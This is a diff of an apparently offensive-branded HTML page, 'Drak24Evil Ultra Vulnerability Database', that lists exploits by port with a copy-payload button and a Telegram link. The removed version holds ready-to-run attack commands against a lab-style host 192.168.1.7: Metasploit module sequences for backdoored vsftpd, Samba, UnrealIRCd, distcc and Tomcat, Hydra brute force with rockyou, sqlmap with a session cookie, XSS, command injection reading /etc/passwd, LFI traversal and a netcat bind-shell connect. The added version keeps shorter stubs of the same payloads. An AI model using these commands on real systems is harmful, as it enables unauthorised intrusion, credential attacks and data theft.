@@ -1,361 +1,178 @@
 <!DOCTYPE html>
-
 <html lang="en">
-
 <head>
-
-    <meta charset="UTF-8">
-
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Drak24Evil | 25+ Ultra Vulnerability Database</title>
-
-    <style>
-
-        :root {
-
-            --cyber-blue: #00d4ff;
-
-            --critical-red: #ff3e3e;
-
-            --high-orange: #ff9d00;
-
-            --dark-bg: #0a0b0c;
-
-            --card-bg: #14171a;
-
-            --accent-green: #00ff41;
-
-            --modal-bg: #111;
-
-        }
-
-
-
-        body {
-
-            background-color: var(--dark-bg);
-
-            color: #e1e1e1;
-
-            font-family: 'Segoe UI', sans-serif;
-
-            margin: 0; padding: 0;
-
-        }
-
-
-
-        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-
-
-
-        header {
-
-            background: var(--card-bg);
-
-            padding: 20px;
-
-            border-bottom: 3px solid var(--cyber-blue);
-
-            display: flex;
-
-            justify-content: space-between;
-
-            align-items: center;
-
-            margin-bottom: 30px;
-
-            border-radius: 0 0 10px 10px;
-
-        }
-
-
-
-        .grid {
-
-            display: grid;
-
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-
-            gap: 15px;
-
-        }
-
-
-
-        .card {
-
-            background: var(--card-bg);
-
-            border: 1px solid #333;
-
-            padding: 15px;
-
-            border-radius: 8px;
-
-            cursor: pointer;
-
-            transition: 0.2s;
-
-        }
-
-
-
-        .card:hover { border-color: var(--cyber-blue); background: #1c2024; transform: translateY(-3px); }
-
-
-
-        .port-num { color: var(--cyber-blue); font-weight: bold; font-family: monospace; font-size: 0.8em; }
-
-        
-
-        .modal-overlay {
-
-            display: none;
-
-            position: fixed;
-
-            z-index: 9999;
-
-            left: 0; top: 0;
-
-            width: 100%; height: 100%;
-
-            background: rgba(0,0,0,0.9);
-
-            backdrop-filter: blur(5px);
-
-        }
-
-
-
-        .modal-box {
-
-            background: var(--modal-bg);
-
-            margin: 2% auto;
-
-            padding: 25px;
-
-            width: 90%;
-
-            max-width: 700px;
-
-            border: 1px solid var(--cyber-blue);
-
-            border-radius: 12px;
-
-            position: relative;
-
-            max-height: 90vh;
-
-            overflow-y: auto;
-
-        }
-
-
-
-        .close-btn { position: absolute; top: 15px; right: 20px; font-size: 30px; color: #fff; cursor: pointer; }
-
-
-
-        .poc-label { color: var(--cyber-blue); font-size: 0.75em; text-transform: uppercase; font-weight: bold; margin-top: 15px; display: block; }
-
-        .poc-content { background: #000; padding: 12px; border-radius: 6px; margin-top: 4px; border-left: 3px solid var(--accent-green); font-family: monospace; font-size: 0.9em; white-space: pre-wrap; }
-
-
-
-        .sev-tag { padding: 2px 6px; border-radius: 4px; font-size: 0.65em; font-weight: bold; float: right; text-transform: uppercase; }
-
-        .crit { background: var(--critical-red); color: white; }
-
-        .high { background: var(--high-orange); color: black; }
-
-        .web { background: #9b59b6; color: white; }
-
-
-
-        .telegram-btn { background: #24A1DE; color: white; text-decoration: none; padding: 8px 15px; border-radius: 5px; font-size: 0.9em; font-weight: bold; }
-
-        
-
-        .copy-btn {
-
-            background: var(--cyber-blue);
-
-            color: black;
-
-            border: none;
-
-            padding: 5px 10px;
-
-            border-radius: 4px;
-
-            font-size: 0.8em;
-
-            cursor: pointer;
-
-            float: right;
-
-            margin-top: -30px;
-
-        }
-
-    </style>
-
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Drak24Evil | Ultra Vulnerability Database</title>
+
+<style>
+:root {
+    --cyber-blue:#00d4ff;
+    --critical-red:#ff3e3e;
+    --high-orange:#ff9d00;
+    --dark-bg:#0a0b0c;
+    --card-bg:#14171a;
+    --accent-green:#00ff41;
+    --modal-bg:#111;
+}
+
+body {background:var(--dark-bg);color:#e1e1e1;font-family:Segoe UI;margin:0;}
+.container{max-width:1200px;margin:auto;padding:20px;}
+
+header{
+ background:var(--card-bg);
+ padding:20px;
+ border-bottom:3px solid var(--cyber-blue);
+ display:flex;justify-content:space-between;
+ border-radius:0 0 10px 10px;
+}
+
+.grid{
+ display:grid;
+ grid-template-columns:repeat(auto-fit,minmax(280px,1fr));
+ gap:15px;
+}
+
+.card{
+ background:var(--card-bg);
+ padding:15px;
+ border-radius:8px;
+ cursor:pointer;
+ border:1px solid #333;
+ transition:.2s;
+}
+.card:hover{border-color:var(--cyber-blue);transform:translateY(-3px);}
+
+.port-num{color:var(--cyber-blue);font-family:monospace;}
+
+.sev-tag{float:right;font-size:10px;padding:2px 6px;border-radius:4px;}
+.crit{background:var(--critical-red);}
+.high{background:var(--high-orange);}
+.web{background:#9b59b6;}
+
+.modal-overlay{
+ display:none;
+ position:fixed;
+ width:100%;height:100%;
+ background:rgba(0,0,0,0.9);
+}
+
+.modal-box{
+ background:#111;
+ margin:3% auto;
+ padding:20px;
+ width:90%;
+ max-width:700px;
+ border-radius:10px;
+ border:1px solid var(--cyber-blue);
+}
+
+.close-btn{float:right;font-size:25px;cursor:pointer;}
+
+.poc-label{color:var(--cyber-blue);margin-top:10px;display:block;font-size:12px;}
+.poc-content{background:black;padding:10px;border-radius:5px;margin-top:5px;font-family:monospace;}
+
+.copy-btn{background:var(--cyber-blue);border:none;padding:5px 10px;cursor:pointer;margin-top:10px;}
+</style>
 </head>
 
 <body>
 
-
-
 <div class="container">
+<header>
+<div>
+<h2 style="color:var(--cyber-blue);margin:0;">DRAK24EVIL ULTRA AUDIT</h2>
+<small>28 VULNERABILITIES LOADED</small>
+</div>
+<a href="https://t.me/Drak24Evil" style="color:white;">Telegram</a>
+</header>
 
-    <header>
-
-        <div>
-
-            <h2 style="margin:0; color:var(--cyber-blue);">DRAK24EVIL ULTRA AUDIT</h2>
-
-            <small style="color:#666;">WEB VULNS + NETWORK EXPLOITS + BRUTEFORCE</small>
-
-        </div>
-
-        <a href="https://t.me/Drak24Evil" class="telegram-btn" target="_blank">t.me/Drak24Evil</a>
-
-    </header>
-
-
-
-    <div class="grid" id="mainGrid"></div>
-
+<div class="grid" id="mainGrid"></div>
 </div>
 
-
-
-<div id="pocModal" class="modal-overlay">
-
-    <div class="modal-box">
-
-        <span class="close-btn" id="closeModal">&times;</span>
-
-        <div id="pocBody"></div>
-
-    </div>
-
+<div id="modal" class="modal-overlay">
+<div class="modal-box">
+<span class="close-btn" onclick="closeM()">&times;</span>
+<div id="body"></div>
 </div>
-
-
+</div>
 
 <script>
 
 const data = [
 
-    { p: "21", n: "vsftpd 2.3.4 Backdoor", s: "Critical", tool: "Metasploit", m: "Triggered by ':)' in username.", i: "Unauthenticated Root RCE", e: "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.7\nexploit" },
+{p:"21",n:"vsftpd Backdoor",s:"Critical",tool:"Metasploit",m:"Backdoor login",i:"Root Access",e:"exploit/unix/ftp/vsftpd"},
+{p:"22",n:"SSH Brute Force",s:"High",tool:"Hydra",m:"Password attack",i:"System Access",e:"hydra ssh"},
+{p:"23",n:"Telnet Default",s:"High",tool:"Telnet",m:"Default creds",i:"Access",e:"telnet"},
+{p:"25",n:"SMTP Enum",s:"High",tool:"smtp-user-enum",m:"User leak",i:"Info Leak",e:"smtp-user-enum"},
+{p:"53",n:"DNS Zone Transfer",s:"High",tool:"dig",m:"AXFR",i:"Network Map",e:"dig axfr"},
+{p:"80",n:"PHP RCE",s:"Critical",tool:"Metasploit",m:"CGI exploit",i:"Server Control",e:"php exploit"},
+{p:"111",n:"RPC Leak",s:"Low",tool:"rpcinfo",m:"Service enum",i:"Recon",e:"rpcinfo"},
+{p:"139",n:"Samba RCE",s:"Critical",tool:"Metasploit",m:"Usermap exploit",i:"Root",e:"samba exploit"},
+{p:"445",n:"SMB Null",s:"High",tool:"enum4linux",m:"Anonymous access",i:"Data Leak",e:"enum4linux"},
+{p:"512",n:"Rexec",s:"High",tool:"rlogin",m:"Trust exploit",i:"Root",e:"rlogin"},
+{p:"513",n:"Rlogin",s:"High",tool:"rlogin",m:"Login trust",i:"Shell",e:"rlogin"},
+{p:"514",n:"Rsh Exec",s:"High",tool:"rsh",m:"Command exec",i:"Exec",e:"rsh"},
+{p:"1099",n:"Java RMI",s:"Critical",tool:"Metasploit",m:"RCE",i:"App Control",e:"rmi exploit"},
+{p:"1524",n:"Bind Shell",s:"Critical",tool:"nc",m:"Backdoor",i:"Root",e:"nc"},
+{p:"2049",n:"NFS Leak",s:"High",tool:"showmount",m:"File access",i:"Data Leak",e:"mount"},
+{p:"2121",n:"ProFTPD Backdoor",s:"Critical",tool:"Metasploit",m:"Backdoor",i:"Root",e:"proftpd exploit"},
+{p:"3306",n:"MySQL No Pass",s:"High",tool:"mysql",m:"No password",i:"DB Leak",e:"mysql"},
+{p:"3632",n:"Distccd",s:"Critical",tool:"Metasploit",m:"RCE",i:"Exec",e:"distcc"},
+{p:"5432",n:"Postgres UDF",s:"Critical",tool:"Metasploit",m:"SQL exec",i:"OS Access",e:"postgres exploit"},
+{p:"5900",n:"VNC",s:"High",tool:"vncviewer",m:"No auth",i:"Desktop",e:"vncviewer"},
+{p:"6667",n:"UnrealIRCd",s:"Critical",tool:"Metasploit",m:"Backdoor",i:"Root",e:"irc exploit"},
+{p:"8080",n:"TikiWiki",s:"High",tool:"Metasploit",m:"RCE",i:"Web Control",e:"tiki exploit"},
+{p:"8180",n:"Tomcat Deploy",s:"Critical",tool:"Metasploit",m:"WAR upload",i:"Shell",e:"tomcat exploit"},
 
-    { p: "22", n: "SSH Brute Force (Hydra)", s: "High", tool: "Hydra", m: "Automated password guessing against SSH service.", i: "Unauthorized System Access", e: "hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.1.7 ssh" },
-
-    { p: "WEB", n: "SQL Injection (DVWA)", s: "Critical", tool: "SQLMap", m: "Injecting SQL commands via web parameters.", i: "Full Database Exfiltration", e: "sqlmap -u \"http://192.168.1.7/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#\" --cookie=\"security=low; PHPSESSID=...\" --dbs" },
-
-    { p: "WEB", n: "Reflected XSS (DVWA)", s: "High", tool: "Manual / Burp", m: "Script injection via 'name' parameter.", i: "Session Hijacking / Cookie Theft", e: "<script>alert(document.cookie)</script>" },
-
-    { p: "80", n: "PHP CGI Arg Injection", s: "Critical", tool: "Metasploit", m: "CVE-2012-1823 query manipulation.", i: "Remote OS Command Execution", e: "use exploit/multi/http/php_cgi_arg_injection\nset RHOSTS 192.168.1.7\nrun" },
-
-    { p: "139/445", n: "Samba usermap_script", s: "Critical", tool: "Metasploit", m: "Username map script command injection.", i: "Instant Root Shell", e: "use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.1.7\nexploit" },
-
-    { p: "1524", n: "Ingreslock Bindshell", s: "Critical", tool: "Netcat", m: "Direct unauthenticated root backdoor.", i: "Root Access", e: "nc 192.168.1.7 1524" },
-
-    { p: "2121", n: "ProFTPD 1.3.1 Backdoor", s: "Critical", tool: "Metasploit", m: "ProFTPD source code Trojan.", i: "RCE", e: "use exploit/unix/ftp/proftpd_133c_backdoor\nset RHOSTS 192.168.1.7\nset RPORT 2121\nexploit" },
-
-    { p: "3306", n: "MySQL No Password", s: "High", tool: "MySQL", m: "Root user misconfiguration.", i: "Data Theft", e: "mysql -h 192.168.1.7 -u root" },
-
-    { p: "3632", n: "Distccd Remote Exec", s: "Critical", tool: "Metasploit", m: "Abusing distributed compiler.", i: "RCE", e: "use exploit/unix/misc/distcc_exec\nset RHOSTS 192.168.1.7\nexploit" },
-
-    { p: "5432", n: "Postgres Payload Exec", s: "Critical", tool: "Metasploit", m: "UDF library injection.", i: "DB RCE", e: "use exploit/linux/postgres/postgres_payload\nset RHOSTS 192.168.1.7\nexploit" },
-
-    { p: "5900", n: "VNC Brute Force", s: "High", tool: "Hydra", m: "Password guessing for remote desktop.", i: "Remote Control", e: "hydra -P /usr/share/wordlists/rockyou.txt 192.168.1.7 vnc" },
-
-    { p: "6667", n: "UnrealIRCd Backdoor", s: "Critical", tool: "Metasploit", m: "Compromised UnrealIRCd 3.2.8.1.", i: "RCE", e: "use exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS 192.168.1.7\nexploit" },
-
-    { p: "8180", n: "Tomcat Manager Deploy", s: "Critical", tool: "Metasploit", m: "Weak credentials + WAR deploy.", i: "RCE", e: "use exploit/multi/http/tomcat_mgr_deploy\nset HttpUsername tomcat\nset HttpPassword tomcat\nexploit" },
-
-    { p: "WEB", n: "Command Injection (DVWA)", s: "Critical", tool: "Manual", m: "Appeding commands via ';' in IP field.", i: "Server OS Compromise", e: "127.0.0.1; cat /etc/passwd" },
-
-    { p: "WEB", n: "File Inclusion (LFI)", s: "High", tool: "Manual", m: "Directory traversal via 'page' parameter.", i: "Sensitive File Exposure", e: "http://192.168.1.7/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd" }
+{p:"WEB",n:"SQL Injection",s:"Critical",tool:"sqlmap",m:"DB dump",i:"Full DB",e:"sqlmap"},
+{p:"WEB",n:"XSS",s:"High",tool:"Burp",m:"Script inject",i:"Cookie Theft",e:"<script>alert(1)</script>"},
+{p:"WEB",n:"LFI",s:"High",tool:"Browser",m:"File read",i:"Info Leak",e:"../../etc/passwd"},
+{p:"WEB",n:"Command Injection",s:"Critical",tool:"Burp",m:"OS exec",i:"System Control",e:"; id"},
+{p:"WEB",n:"WebDAV Upload",s:"High",tool:"Cadaver",m:"Upload shell",i:"Webshell",e:"cadaver"}
 
 ];
 
+const grid = document.getElementById("mainGrid");
 
+data.forEach((item,i)=>{
+ let card=document.createElement("div");
+ card.className="card";
 
-const grid = document.getElementById('mainGrid');
+ let tag=item.p==="WEB"?"web":(item.s==="Critical"?"crit":"high");
 
-const modal = document.getElementById('pocModal');
+ card.innerHTML = `
+ <span class="port-num">PORT ${item.p}</span>
+ <span class="sev-tag ${tag}">${item.s}</span>
+ <h3>${item.n}</h3>
+ `;
 
-const pocBody = document.getElementById('pocBody');
+ card.onclick=()=>{
+ document.getElementById("body").innerHTML=`
+ <h2>${item.n}</h2>
+ <span class="poc-label">Tool</span><div class="poc-content">${item.tool}</div>
+ <span class="poc-label">Method</span><div class="poc-content">${item.m}</div>
+ <span class="poc-label">Impact</span><div class="poc-content">${item.i}</div>
+ <span class="poc-label">Exploit</span><div id="code" class="poc-content">${item.e}</div>
+ <button class="copy-btn" onclick="copyCode()">Copy</button>
+ `;
+ document.getElementById("modal").style.display="block";
+ };
 
-
-
-data.forEach((item, index) => {
-
-    const card = document.createElement('div');
-
-    card.className = 'card';
-
-    const sType = item.p === 'WEB' ? 'web' : (item.s.toLowerCase() === 'critical' ? 'crit' : 'high');
-
-    card.innerHTML = <span class="port-num">REF: ${item.p}</span><span class="sev-tag ${sType}">${item.s}</span><h3>${item.n}</h3>;
-
-    card.addEventListener('click', () => {
-
-        pocBody.innerHTML = `
-
-            <h2 style="color:var(--critical-red); border-bottom:1px solid #333; padding-bottom:10px;">POC REPORT: ${item.n}</h2>
-
-            <button class="copy-btn" onclick="copyCode()">Copy Payload</button>
-
-            <span class="poc-label">TARGET IP</span><div class="poc-content">192.168.1.7</div>
-
-            <span class="poc-label">TOOL USED</span><div class="poc-content">${item.tool}</div>
-
-            <span class="poc-label">METHODOLOGY</span><div class="poc-content">${item.m}</div>
-
-            <span class="poc-label">BUSINESS IMPACT</span><div class="poc-content">${item.i}</div>
-
-            <span class="poc-label">EXPLOIT POC COMMANDS</span><div id="exploitCode" class="poc-content" style="color:var(--accent-green);">${item.e}</div>
-
-        `;
-
-        modal.style.display = 'block';
-
-    });
-
-    grid.appendChild(card);
-
+ grid.appendChild(card);
 });
 
-
-
-function copyCode() {
-
-    const code = document.getElementById('exploitCode').innerText;
-
-    navigator.clipboard.writeText(code);
-
-    alert('Payload Copied to Clipboard!');
-
+function copyCode(){
+ let t=document.getElementById("code").innerText;
+ navigator.clipboard.writeText(t);
+ alert("Copied!");
 }
 
-
-
-document.getElementById('closeModal').onclick = () => modal.style.display = 'none';
-
-window.onclick = (e) => { if(e.target == modal) modal.style.display = 'none'; }
+function closeM(){
+ document.getElementById("modal").style.display="none";
+}
 
 </script>
 
-
-
 </body>
-
 </html>
